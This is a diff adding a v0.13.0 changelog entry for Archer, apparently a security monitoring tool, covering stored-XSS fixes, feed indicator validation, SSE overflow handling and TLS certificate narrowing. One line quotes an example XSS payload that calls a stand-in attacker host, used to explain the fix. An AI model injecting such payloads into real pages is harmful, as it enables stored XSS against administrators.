@@ -30,6 +30,203 @@ relevant, `### Detection changes` in each release entry.
 
 ## [Unreleased]
 
+## [v0.13.0] — 2026-05-10
+
+Fifth audit-driven correctness release. Five items (NEW-25 through
+NEW-29) plus a three-item low-priority cluster surfaced by the
+2026-05-10 external review (sixth pass on the codebase). Two of
+the items are the auditor's own correction to a previous
+"no XSS today" claim — re-reading the SPA more thoroughly turned
+up two real innerHTML sinks in `notifications.js` and
+`campaigns.js` that the prior round had missed. The fixes are
+mechanical (`_esc()` wraps), but pairing them with feed-ingest
+shape validation closes both the rendering and ingest sides of
+the path.
+
+The unifying theme this round: **defense-in-depth at every
+boundary**. The XSS path (NEW-26 / NEW-27) is closed by frontend
+escape, AND by feed-ingest shape validation (NEW-28). The TLS
+auto-gen narrowing (NEW-25) is paired with operator-CA cert
+validation so both halves of the cert workflow surface clear
+errors. The SSE silent-drop fix (NEW-29) trades best-effort
+delivery for explicit "I missed events; re-sync" semantics
+because a security tool's live channel can't afford to silently
+swallow CRITICAL alerts. Recorded as a maturation lesson in
+MATURATION_PLAN section 8.
+
+### Added
+
+- **Per-module `_esc()` helpers in notifications.js and
+  campaigns.js (NEW-26, NEW-27).** Same shape as the existing
+  helpers in detail.js and feeds.js; kept private to each
+  IIFE-scoped module to match codebase convention. Escapes
+  `&`, `<`, `>`, `"`, `'` so both HTML-text and attribute
+  contexts (e.g. `title="${...}"`) are safe. Pre-fix
+  `notifications.js` rendered server-supplied `severity`,
+  `type`, `src_ip`, `dst_ip`, `dst_port` directly into
+  innerHTML; `campaigns.js` rendered `e.dst` (in two places —
+  `title=` attribute and cell body), `e.srcs`, and `e.ip` the
+  same way. Reachable via TI Hit findings whose dst_ip carried
+  a malicious indicator from a feed; the feed-ingest
+  validation in NEW-28 closes the upstream, this is defense-
+  in-depth on the rendering side. Audit 2026-05-10
+  NEW-26/NEW-27.
+
+- **`internal/feeds/validate.go` indicator shape validation
+  (NEW-28).** New `validDomain()` (RFC 1035-ish regex with
+  leading-underscore concession for SRV-style records, 253-char
+  cap) and `validHash()` (hex of length 32/40/64/128). Wired
+  into `normalizeMISPAttribute` (domain/hostname/md5/sha1/
+  sha256 branches) and OpenCTI `stixValue`-extracted indicator
+  classification (Domain-Name/Hostname/StixFile branches).
+  Pre-fix any non-empty `TrimSpace`'d string was accepted as a
+  "domain" indicator; combined with the rendering bugs in
+  NEW-26/NEW-27, a malicious indicator like
+  `<img src=x onerror=fetch('//attacker.test')>` could land a
+  stored XSS that fired in every admin browser when the
+  notification panel or campaigns view rendered. The shape
+  control rejects this at the boundary. New
+  `validate_test.go` exercises both validators across realistic-
+  domain / malicious-shape / canonical-hash / wrong-length
+  cases plus end-to-end normalizer regression tests.
+
+- **SSE `resync_required` overflow canary (NEW-29).** Pre-fix a
+  slow consumer's full buffer caused `Publish` to silently drop
+  events; for a security tool whose live channel includes new
+  TI hits, unauthorized sensor attempts, and CRITICAL findings,
+  silent drops are a real information-loss bug. Post-fix the
+  broker drains the channel and inserts a single
+  `resync_required` event when the buffer fills, then no-ops
+  further publishes until ServeHTTP delivers the canary and
+  flips the per-client overflow flag back off. Frontend
+  (sse.js + app.js) handles the event by re-fetching
+  `/api/findings` and `/api/notifications` — the source-of-
+  truth endpoints the dropped events would have updated. New
+  `sse_broker_test.go` covers overflow → canary, no-op-after-
+  overflow, and healthy-consumer-no-canary cases.
+
+- **`loadAndValidateOperatorTLS()` for path-1 cert/key check.**
+  Parses the cert and key on load; surfaces clear startup
+  errors for expired (`cert ... expired ...`), corrupt, or
+  key-mismatched (`key ... does not match cert ... public
+  key`) files, naming the file in each error. Falls back
+  through PKCS#8 → PKCS#1 → SEC1 PEM formats so an operator
+  who generated the key with `openssl ecparam -genkey` (SEC1
+  form) or `openssl genrsa` (PKCS#1) gets a working cert
+  rather than a parse error. Pre-fix only file existence was
+  checked, so an expired/corrupt/key-mismatched cert silently
+  passed through and the listener failed at first sensor
+  connect with a cryptic OpenSSL-flavored error. Audit
+  2026-05-10 follow-up to NEW-25.
+
+- **Eight new regression tests** —
+  `TestValidDomain_AcceptsRealDomains` /
+  `TestValidDomain_RejectsMaliciousAndMalformed` (NEW-28),
+  `TestValidHash_AcceptsCanonicalLengths` /
+  `TestValidHash_RejectsBadShapes` (NEW-28),
+  `TestNormalizeMISPAttribute_RejectsMaliciousDomain` /
+  `TestNormalizeMISPAttribute_RejectsMalformedHash` (NEW-28),
+  `TestBrokerPublish_OverflowEmitsResyncRequired` /
+  `TestBrokerPublish_NoOpAfterOverflow` /
+  `TestBrokerPublish_NoOverflowOnHealthyConsumer` (NEW-29),
+  `TestEnsureTLS_AutoGenIsServerOnly` (NEW-25),
+  `TestEnsureTLS_RejectsExpiredOperatorCert` /
+  `TestEnsureTLS_RejectsKeyMismatch` (NEW-25 follow-up),
+  `TestEnsureTLS_AcceptsValidOperatorECDSA` (multi-format PEM
+  fallback).
+
+### Changed
+
+- **Auto-gen TLS cert is now server-only end-entity (NEW-25).**
+  Pre-fix template had `IsCA=true` and
+  `KeyUsage: DigitalSignature | CertSign`. Pinned-pubkey
+  verification doesn't care about chain shape — sensors
+  match the cert's `SubjectPublicKeyInfo`, not the chain — so
+  the IsCA flag was functionally ignored by current
+  consumers. The risk was one step removed: if the cert ever
+  ended up in a system trust store (operator runs
+  `update-ca-certificates`, copies it to a workstation,
+  container build adds it to the trust bundle), it became a
+  CA for any domain anyone with read access to
+  `/data/server.key` wanted to sign. The private key sits at
+  mode 0o600 in the data volume, so anyone with shell access
+  to that mount had CA signing capability, not just server-
+  impersonation. New posture: `IsCA=false`,
+  `KeyUsage: DigitalSignature | KeyEncipherment`,
+  `ExtKeyUsage: ServerAuth`. No behavior change for any
+  current or future legitimate consumer. Path 1 (operator-
+  supplied cert) is independent — operator brings whatever
+  shape their CA issues; the narrowing only affects the
+  auto-gen path.
+
+- **`localIPs()` filters IPv6 link-local addresses from cert
+  SAN.** No sensor talks to a `fe80::/10` address — link-local
+  addresses are interface-scoped and require zone identifiers
+  to be reachable. Pre-fix they were emitted into the SAN list
+  alongside loopback (which was already filtered); now both
+  are filtered. Just bloat removal; no behavior change for any
+  legitimate connection. Audit 2026-05-10 LOW.
+
+- **`statfsBytes` computes in `uint64` and clamps on overflow.**
+  Pre-fix the multiplication `int64(st.Bavail) * int64(st.Bsize)`
+  on uint64 inputs could overflow signed int64 on a sufficiently
+  large filesystem (PB-class today, EB-class on a future host),
+  silently rendering negative bytes in the UI. Post-fix computes
+  in uint64 and clamps to `math.MaxInt64` before conversion.
+  Theoretical at homelab/team scale, fixed for correctness.
+  Audit 2026-05-10 LOW.
+
+- **Disk-usage `BySensor` breakdown filters against enrolled
+  sensor name set.** Pre-fix any subdirectory under `logsDir`
+  showed up in the per-sensor breakdown, including manually-
+  dropped trees (`/logs/test/`, leftover analyst stashes).
+  Accurate-but-confusing reporting. Post-fix the per-sensor
+  list only names directories whose name matches an enrolled
+  sensor; the total still includes orphan directories' bytes
+  (they're real on disk) but they don't pose as sensors in the
+  UI. Audit 2026-05-10 LOW.
+
+### Fixed
+
+- **Stored XSS reachable via feed-injected indicators (NEW-26
+  + NEW-27 + NEW-28).** Three-layer fix — frontend escape in
+  the two innerHTML sinks the previous audit round missed,
+  plus shape validation at the feed-ingest boundary so a
+  malicious indicator can't reach the matcher in the first
+  place. The auditor's framing on this round captures the
+  lesson: a positive claim about a surface ("the SPA escapes
+  consistently") needs every file on that surface read, not a
+  representative sample. Recorded in MATURATION_PLAN
+  section 8.
+
+- **SSE silent drops on slow-consumer overflow (NEW-29).** See
+  "Added" above for the resync_required design. Bandwidth-
+  budgets-and-buffer-sizing tradeoffs — the 32-event cap was
+  fine for normal load and lets the overflow path handle the
+  pathological case explicitly rather than expanding the
+  buffer to mask the problem.
+
+- **TLS auto-gen cert IsCA overscoping (NEW-25).** See
+  "Changed" above.
+
+- **Operator-supplied TLS cert/key now fail loudly at startup
+  on expired / corrupt / key-mismatched files.** Same
+  motivation as NEW-25 — clear startup error beats cryptic
+  TLS handshake failure 30 seconds later.
+
+### Maturation lesson
+
+- **Asserting a positive across surfaces requires reading
+  every surface.** The "no XSS today" claim from the v0.12.0
+  audit round was a partial sample (four SPA files read; two
+  not read were the ones with the bugs). Recorded in
+  MATURATION_PLAN section 8 with two implications: claims
+  about a property holding across N files need to be either
+  exhaustively verified or stated as conditional ("no XSS in
+  the four files I read"). For future audit rounds, prefer
+  the conditional form unless the verification was actually
+  exhaustive.
+
 ## [v0.12.0] — 2026-05-10
 
 Fourth audit-driven correctness release. Eleven items (NEW-14
@@ -2243,7 +2440,8 @@ The baseline detection behavior is the in-tree state at this cut.
   replaced with the runtime version (`v0.1.0` at this cut). Any external
   tooling that parsed the literal as a sentinel needs a one-line update.
 
-[Unreleased]: https://github.com/BushidoCyb3r/Archer/compare/v0.12.0...HEAD
+[Unreleased]: https://github.com/BushidoCyb3r/Archer/compare/v0.13.0...HEAD
+[v0.13.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.12.0...v0.13.0
 [v0.12.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.11.0...v0.12.0
 [v0.11.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.10.0...v0.11.0
 [v0.10.0]: https://github.com/BushidoCyb3r/Archer/compare/v0.9.0...v0.10.0
